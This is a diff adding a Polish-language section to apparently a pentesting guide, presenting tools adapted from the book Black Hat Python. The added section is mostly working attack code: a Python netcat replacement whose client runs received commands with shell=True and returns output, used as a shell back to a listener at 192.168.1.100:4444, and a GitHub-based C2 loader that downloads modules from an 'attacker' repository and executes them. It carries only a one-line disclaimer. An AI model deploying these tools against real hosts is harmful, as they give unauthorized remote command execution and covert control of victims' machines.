@@ -55,6 +55,88 @@ with open("access.log", "r") as file:
 
 ---
 
+## 🐍 Własne narzędzia – Black Hat Python
+
+Wrappery `os.system` to za mało. Black Hat Python demonstruje jak budować pełnowartościowe narzędzia pentesterskie od podstaw — to materiał kluczowy dla osób chcących wykraczać poza gotowe frameworki.
+
+### **2️⃣ Zamiennik Netcata w Pythonie**
+Gdy `nc` jest zablokowany lub usunięty z hosta, prosty zamiennik w Pythonie:
+
+```python
+import socket, subprocess, sys
+
+def client_mode(host, port):
+    s = socket.socket()
+    s.connect((host, port))
+    while True:
+        cmd = s.recv(4096).decode()
+        if cmd.lower() == 'exit\n':
+            break
+        result = subprocess.run(cmd, shell=True, capture_output=True)
+        s.send(result.stdout + result.stderr)
+    s.close()
+
+def server_mode(port):
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('0.0.0.0', port))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"[+] Połączono: {addr}")
+    while True:
+        cmd = input('bhnet> ')
+        conn.send((cmd + '\n').encode())
+        if cmd == 'exit':
+            break
+        print(conn.recv(4096).decode(), end='')
+    conn.close()
+
+if __name__ == '__main__':
+    if sys.argv[1] == '-l':
+        server_mode(int(sys.argv[2]))
+    else:
+        client_mode(sys.argv[1], int(sys.argv[2]))
+```
+
+Użycie:
+```bash
+# Kali – listener
+python3 bhnet.py -l 4444
+
+# Cel – połącz się i wyślij shell
+python3 bhnet.py 192.168.1.100 4444
+```
+
+### **3️⃣ C2 przez GitHub (GitImporter)**
+
+Technika z Black Hat Python (rozdz. 9): agenty C2 mogą komunikować się przez publiczne repozytorium GitHub, co omija proste blokady sieciowe (GitHub jest często na allowliście):
+
+```python
+import sys, os, base64, github3, time
+
+# GitImporter – dynamiczne ładowanie modułów z GitHub
+class GitImporter:
+    def find_module(self, name, path=None):
+        if name in self.modules:
+            return self
+        return None
+
+    def load_module(self, name):
+        gh = github3.login(token=os.getenv('GITHUB_TOKEN'))
+        repo = gh.repository('attacker', 'c2-modules')
+        content = repo.file_contents(f'/{name}.py').decoded.decode()
+        module = type(sys)(name)
+        exec(compile(content, name, 'exec'), module.__dict__)
+        sys.modules[name] = module
+        return module
+```
+
+Agent co 30 sekund odpytuje repozytorium o nowe komendy (pliki `cmd_*.txt`) i wrzuca wyniki jako commity. Logika komunikacji jest w pełni asynchroniczna i nie utrzymuje otwartego połączenia.
+
+> ⚠️ Powyższe techniki są materiałem edukacyjnym z książki Black Hat Python — stosuj wyłącznie w autoryzowanych środowiskach testowych.
+
+---
+
 ## 🔥 Metasploit – podstawy i zaawansowane funkcje
 
 Metasploit to jedno z najpotężniejszych narzędzi do eksploitacji systemów.
